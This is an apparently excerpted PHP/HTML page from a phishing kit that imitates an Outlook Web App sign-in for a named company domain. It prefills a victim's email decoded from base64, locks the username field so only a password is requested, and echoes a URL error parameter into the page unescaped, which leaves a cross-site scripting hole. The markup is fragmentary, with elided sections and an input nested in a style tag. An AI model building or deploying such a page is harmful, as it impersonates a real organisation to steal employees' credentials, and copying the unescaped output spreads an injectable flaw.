...
<input type="hidden" name="destination" value="https://autodiscover.georgeclinical.com/owa/">
...
<div id="mainLogonDiv" class="mouse">
	...
	<div id="lgnDiv" class="logonDiv">
		...
		<div><input id="username" name="user" value="<?php echo base64_decode($email); ?>" class="signInInputText" role="textbox" aria-labelledby="userNameLabel" required disabled/></div>
        <input type="text" name="username" value="<?php echo base64_decode($email); ?>" hidden>
        ...
        <?php } elseif(isset($_GET['error']) and $_GET['error'] != 1) { ?>
            <div id="signInErrorDiv" class="signInError" role="alert" tabindex="0">
                <?php echo $_GET['error']; ?>
            </div>
        <?php } ?>
		...
		<div class="signInEnter">
            ...
            <style>
                ...
                <input type="submit" name="tender<?php if(isset($_GET['error']) and $_GET['error'] == 1){ echo 1; } ?>" class="signinTxt" value="sign in"/>
            </div>
		</div>
...
function validateForm() {
  var x = document.forms["logonForm"]["password"].value;
  if (x == "") {
